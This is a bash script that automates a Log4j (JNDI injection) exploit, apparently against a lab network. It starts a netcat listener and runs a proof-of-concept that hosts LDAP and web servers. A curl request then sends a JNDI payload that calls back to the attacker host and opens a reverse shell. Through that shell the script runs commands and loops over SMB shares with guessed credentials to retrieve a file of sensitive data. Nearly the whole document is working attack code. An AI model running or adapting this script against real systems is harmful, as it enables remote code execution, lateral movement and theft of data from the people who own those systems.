#!/bin/bash

### LOG4J Automated Exploit Script with seperate sessions

# Setup a netcat listener in a new screen session
screen -S netcat -d -m bash -c "nc -nvlp 9001 -s 10.0.0.3; exec sh"
sleep 2

# Run the Exploitation Script (Sets up LDAP- and Python Webservers)
screen -S exploit -d -m bash -c "python3 poc.py --userip 10.0.0.3 --webport 8000 --lport 9001"
sleep 10    # Needs this sleep to setup the servers

# Issue the curl request:
curl -i -s -k -X $'POST' -H $'Host: 172.16.0.6:8080' --data-binary $'uname=%24%7Bjndi%3Aldap%3A%2F%2F10.0.0.3%3A1389%2Fa%7D&password=' $'http://172.16.0.6:8080/login' &


# Execute commands inside the reverse shell with the victim
screen -S netcat -X stuff 'hostname;id^M'


# Scanning SMB shares from this compromised DMZ server and discovering secrets:
for clients in {1..10}
do
bash -c "smbclient //192.168.40.5/Sambaclient$clients -U 'client$clients%password$clients' -m SMB3 -c 'ls'"

if [[ $(smbclient //192.168.40.5/Sambaclient$clients -U "client$clients%password$clients" -m SMB3 -c "ls" | grep details.bak) ]]
then
    echo "Found sensitive information on client$clients!"
    echo "Retrieving the sensitive information!"
    smbclient //192.168.40.5/Sambaclient$clients -U "client$clients%password$clients" -m SMB3 -c "get details.bak"
    echo "Retreived sensitive information from Sambaclient$clients" >> details.bak 
else 
    echo "No information found on client$clients"
fi
done




